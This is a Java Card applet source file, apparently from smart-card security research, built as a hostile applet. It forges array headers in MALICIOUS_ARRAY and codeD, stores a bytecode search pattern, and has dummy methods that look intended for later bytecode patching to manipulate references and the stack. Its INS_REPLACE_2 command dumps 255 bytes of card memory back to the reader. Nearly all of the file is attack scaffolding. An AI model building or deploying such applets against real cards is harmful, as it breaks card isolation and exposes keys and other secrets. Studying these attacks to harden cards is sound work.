package malicepackage;

import javacard.framework.APDU;
import javacard.framework.Applet;
import javacard.framework.ISOException;
import javacard.framework.Util;
import javacard.framework.ISO7816;

public class MaliceApplet extends Applet {
	/* Constantes */
	public static final byte CLA_MALICEAPPLET = (byte) 0xC0;
	
	public static final byte INS_INI_CODED = (byte) 0x00;
	public static final byte INS_GETMYADRESSBYTE = (byte) 0x01;
	public static final byte INS_MODIF_CODED = (byte) 0x02;
	public static final byte INS_MODIF_MAL = (byte) 0x05;
	public static final byte INS_REPLACE = (byte) 0x0A;
	public static final byte INS_REPLACE_2 = (byte) 0x0C;
	public static final byte INS_SUPPR = (byte) 0x0F;
	
	//public static final byte[] TESTTAB = {(byte)0x00, (byte)0x01, (byte)0x02,(byte)0x03};
	
	public byte[] codeD = {(byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
							(byte)0x00, (byte)0x00, (byte)0x7D ,(byte)0x00 ,(byte)0x00 ,(byte)0x78};
	public byte[] searchBuf = new byte[6];
	public byte[] MALICIOUS_ARRAY = {(byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
										(byte)0x7D ,(byte)0x00 ,(byte)0x00 ,(byte)0x78};
	public byte k = (byte) 0;
	public static byte[] find = {(byte)0x11, (byte)0x69, (byte)0x82 ,(byte)0x8D ,(byte)0x00 ,(byte)0x0B};
	public static byte result = (byte) 0x00;
	
	/* Constructeur*/
	private MaliceApplet() {
	}

	
	/* Installeur*/
	public static void install(byte bArray[], short bOffset, byte bLength) throws ISOException {
		new MaliceApplet().register();
	}


	public void process(APDU apdu) throws ISOException {
		byte[] buffer = apdu.getBuffer();
		short var = (short) 0;
		
		if (this.selectingApplet()) return;
		
		if (buffer[ISO7816.OFFSET_CLA] != CLA_MALICEAPPLET) {
			ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
		}
		switch(buffer[ISO7816.OFFSET_INS]) {
			
			case INS_INI_CODED:
				codeD[11] = 0;
				codeD[12] = 0;
				break;
			
			case INS_GETMYADRESSBYTE:
				Util.setShort(buffer, (short) 0, getMyAdresstabByte(MALICIOUS_ARRAY));
				apdu.setOutgoingAndSend((short) 0, (short) 2);
				break;
			
			case INS_MODIF_CODED:
				apdu.setIncomingAndReceive();
				codeD[11] = buffer[ISO7816.OFFSET_CDATA];
				codeD[12] = buffer[ISO7816.OFFSET_CDATA+1];
				break;
			
			case INS_REPLACE:
				for (short i=0;i<10;i++) {
				//while (codeD[3]!=0xFF && codeD[4]!=0xFF) {
//					Util.setShort(searchBuf, k, functionToReplace()); //remplacer par des increments ?
					var++;
					var++;
					var++;
					codeD[12]++;
					if (codeD[12]== (byte)0x00) {
						codeD[11]++;
					}
					// Search and replace ou inscription fichier
					
				}
				break;
			
			case INS_MODIF_MAL:
				apdu.setIncomingAndReceive();
				MALICIOUS_ARRAY[9] = buffer[ISO7816.OFFSET_CDATA];
				MALICIOUS_ARRAY[10] = buffer[ISO7816.OFFSET_CDATA+1];
				break;
				
			case INS_REPLACE_2:
				for (short i=0;i<255;i=(short) (i+2)) {
					Util.setShort(buffer, (short) i, Read(buffer,apdu,k));
					MALICIOUS_ARRAY[10]=(byte) (MALICIOUS_ARRAY[10]+2);
					if (MALICIOUS_ARRAY[10]== (byte)0x00) {
						MALICIOUS_ARRAY[9] = (byte) (MALICIOUS_ARRAY[9]+1);
					}
				}
				apdu.setOutgoingAndSend((short) 0, (short) 255);
				break;
				
			case INS_SUPPR:
				var++;
				var++;
				var++;
				var++;
				var++;
				var++;
				var++;
				var++;
				var++;
				var++;
				break;
				
			default:
				ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
		}
	}
	
	public short getMyAdresstabByte(byte[] tab) {
		short DummyRef = (short)0x11EE;
		tab[0] = (byte)0xFF;
		return DummyRef;
	}
	
	public void ModifyStack(byte[] apduBuffer, APDU apdu, short a) {
		short i = (short) 0x0A0A;
		short j = (short) (getMyAdresstabByte(MALICIOUS_ARRAY)+8);
		i=j;
		return;
	}
	
	public short Read(byte[] apduBuffer, APDU apdu, short a) {
		ModifyStack(apduBuffer,apdu,a);
		return (short) 0x0000;
	}

}
